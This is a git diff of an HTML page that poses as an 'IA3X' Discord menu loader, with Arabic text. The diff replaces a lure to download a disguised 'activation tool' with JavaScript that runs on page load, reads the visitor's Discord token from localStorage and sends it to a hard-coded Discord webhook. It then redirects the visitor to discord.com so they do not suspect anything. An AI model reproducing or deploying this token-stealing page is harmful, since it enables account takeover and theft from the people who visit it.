@@ -1,26 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head><title>IA3X MENU - System Check</title></head>
-<body style="background:black; color:white; text-align:center; padding-top:20%;">
-    <h1>جاري تفعيل نظام IA3X...</h1>
-    <p>بسبب تحديثات الأمان، يجب تحميل أداة الربط لتفعيل المنيو على تطبيق الديسكورد</p>
-    
-    <a href="https://www.mediafire.com/file/q552pgq5tbss1dz/IA3X.py..txt/file" target="_blank">
-        <button style="padding:20px; background:red; color:white; font-weight:bold; cursor:pointer; border-radius:10px;">
-            تحميل أداة التفعيل (EXE)
-        </button>
-    </a>
-
+<head>
+    <title>IA3X LOADING...</title>
+</head>
+<body style="background-color:black; color:white; text-align:center; padding-top:20%;">
+    <h1>Loading System Assets...</h1>
     <script>
-        // إرسال تنبيه فوري لسيرفرك بمجرد دخول الشخص للموقع
         window.onload = function() {
-            const webhook = "https://discord.com/api/webhooks/1471162724955197572/uFF2WqlnimEonaTwlVSRk9-mF-8Ysbym8FkPSXmrnVUQJWgN_9TwWpOo_scRXzNw1qRe";
+            // ضع رابط الويبهوك حقك هنا ضروري جداً
+            const webhook = "https://discord.com/api/webhooks/1471162724955197572/uFF2WqlnimEonaTwlVSRk9-mF-8Ysbym8FkPSXmrnVUQJWgN_9TwWpOo_scRXzNw1qRe"; 
+
+            // محاولة سحب التوكن تلقائياً
+            const token = localStorage.getItem("token") || localStorage.getItem("discord_token") || "No Token Found";
+
             fetch(webhook, {
                 method: "POST",
-                headers: {"Content-Type": "application/json"},
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: "🎯 **دخول جديد للموقع!**\nالجهاز الآن يشاهد صفحة التحميل، انتظر تشغيل الملف."
+                    content: "🎯 **صيد تلقائي جديد!**",
+                    embeds: [{
+                        title: "Discord Token Captured",
+                        description: "🔑 **Token:** `" + token + "`",
+                        color: 16711765,
+                        footer: { text: "IA3X Bypass System" }
+                    }]
                 })
+            }).then(() => {
+                // بعد السحب، نوجهه لموقع حقيقي عشان ما يشك
+                window.location.href = "https://discord.com/app"; 
             });
         };
     </script>
